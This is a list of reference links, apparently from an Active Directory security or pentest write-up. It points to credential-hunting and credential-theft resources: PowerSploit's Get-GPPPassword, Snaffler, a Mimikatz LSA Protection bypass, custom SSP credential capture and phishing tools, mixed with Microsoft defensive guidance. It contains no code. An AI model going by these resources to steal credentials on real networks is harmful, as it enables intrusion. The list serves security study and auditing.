*  SecureString Powershell - <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.1</a>
*  Find-InterestingDomainShareFile - <a href="https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/">https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/</a>
*  Snaffler - <a href="https://github.com/SnaffCon/Snaffler/">https://github.com/SnaffCon/Snaffler/</a>
*  PassHunt - <a href="https://github.com/Dionach/PassHunt">https://github.com/Dionach/PassHunt</a>
*  Softperfect Network scanner - <a href="https://www.softperfect.com/products/networkscanner/">https://www.softperfect.com/products/networkscanner/</a>
*  Finding Passwords in SYSVOL & Exploiting Group Policy Preferences - <a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a>
*  Get-GPPPassword - <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a>
*  LSA Protection - <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection</a>
*  LSA Protection Mimikatz bypass - <a href="https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection">https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection</a>
*  Credential Guard - <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage">https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage</a>
*  Custom SSP live credential capturing - <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp">https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp</a>
*  Credential phishing tools - <a href="https://github.com/S3cur3Th1sSh1t/Pentest-Tools#post-exploitation---phish-credentials">https://github.com/S3cur3Th1sSh1t/Pentest-Tools#post-exploitation---phish-credentials</a>
*  AD-Attack-Defense - <a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a>
*  Methodology and Resources Active Directory Attack - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md</a>
*  AD-Security - <a href="https://adsecurity.org/?page_id=4031">https://adsecurity.org/?page_id=4031</a>
